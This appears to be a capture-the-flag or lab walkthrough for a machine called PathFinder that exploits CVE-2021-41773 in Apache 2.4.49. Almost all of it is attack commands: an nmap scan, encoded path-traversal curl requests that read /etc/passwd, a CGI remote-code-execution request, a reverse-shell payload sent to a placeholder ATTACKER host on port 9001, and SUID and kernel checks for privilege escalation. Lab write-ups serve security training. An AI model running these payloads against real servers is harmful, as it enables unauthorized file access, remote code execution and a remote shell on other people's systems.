# Machine 03: PathFinder — CVE-2021-41773 Walkthrough
## Recon
```bash
nmap -sC -sV 10.10.3.10
# Apache 2.4.49 on port 80
```
## Exploitation
```bash
# Path traversal to read /etc/passwd
curl "http://10.10.3.10/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd"
# CGI-based RCE
curl --data "echo;id" "http://10.10.3.10/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh"
# Reverse shell
curl --data "echo;bash -i >& /dev/tcp/ATTACKER/9001 0>&1" "http://10.10.3.10/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh"
```
## Priv Esc
```bash
uname -r
# Find kernel exploit for the version, or check SUID binaries
find / -perm -u=s -type f 2>/dev/null
```
